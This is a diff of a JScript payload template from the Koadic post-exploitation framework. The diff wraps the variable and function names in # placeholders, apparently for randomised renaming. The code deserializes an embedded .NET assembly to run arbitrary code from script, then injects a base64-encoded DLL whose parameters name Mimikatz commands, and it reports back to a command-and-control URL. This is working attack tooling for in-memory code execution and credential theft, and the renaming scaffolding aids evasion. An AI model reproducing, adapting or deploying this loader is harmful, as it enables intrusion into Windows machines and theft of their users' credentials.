@@ -1,29 +1,29 @@
-function setversion() {
-    var shell = new ActiveXObject('WScript.Shell');
-    ver = 'v4.0.30319';
+function #setversion#() {
+    var #shell# = new ActiveXObject('WScript.Shell');
+    #ver# = 'v4.0.30319';
     try {
-        shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
+        #shell#.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
     } catch(e) {
-        ver = 'v2.0.50727';
+        #ver# = 'v2.0.50727';
     }
-    shell.Environment('Process')('COMPLUS_Version') = ver;
+    #shell#.Environment('Process')('COMPLUS_Version') = #ver#;
 }
 
-function debug(s) {}
+function #debug#(s) {}
 
-function base64ToStream(b) {
-	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
-	var length = enc.GetByteCount_2(b);
-	var ba = enc.GetBytes_4(b);
-	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
-	ba = transform.TransformFinalBlock(ba, 0, length);
-	var ms = new ActiveXObject("System.IO.MemoryStream");
-	ms.Write(ba, 0, (length / 4) * 3);
-	ms.Position = 0;
-	return ms;
+function #base64ToStream#(b) {
+	var #enc# = new ActiveXObject("System.Text.ASCIIEncoding");
+	var #length# = #enc#.GetByteCount_2(b);
+	var #ba# = #enc#.GetBytes_4(b);
+	var #transform# = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
+	#ba# = #transform#.TransformFinalBlock(#ba#, 0, #length#);
+	var #ms# = new ActiveXObject("System.IO.MemoryStream");
+	#ms#.Write(#ba#, 0, (#length# / 4) * 3);
+	#ms#.Position = 0;
+	return #ms#;
 }
 
-var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
+var #serialized_obj# = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
 "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
 "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
 "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
@@ -118,20 +118,20 @@ var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYW
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
 "AAAAAAAAAAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJl"+
 "ZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL";
-var entry_class = 'TestClass';
+var #entry_class# = 'TestClass';
 
 try {
-	setversion();
-	var stm = base64ToStream(serialized_obj);
-	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
-	var al = new ActiveXObject('System.Collections.ArrayList');
-	var d = fmt.Deserialize_2(stm);
-	al.Add(undefined);
-	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
+	#setversion#();
+	var #stm# = #base64ToStream#(#serialized_obj#);
+	var #fmt# = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+	var #al# = new ActiveXObject('System.Collections.ArrayList');
+	var #d# = #fmt#.Deserialize_2(#stm#);
+	#al#.Add(undefined);
+	var #o# = #d#.DynamicInvoke(#al#.ToArray()).CreateInstance(#entry_class#);
 
-    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();
-    var base64DLL = ~SHIMB64~
-    o.InjectDLL(base64DLL, shim_lpParam, ~SHIMOFFSET~);
+    var #shim_lpParam# = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();
+    var #base64DLL# = ~SHIMB64~
+    #o#.InjectDLL(#base64DLL#, #shim_lpParam#, ~SHIMOFFSET~);
     Koadic.work.report("Done");
 } catch (e) {
     Koadic.work.error(e);
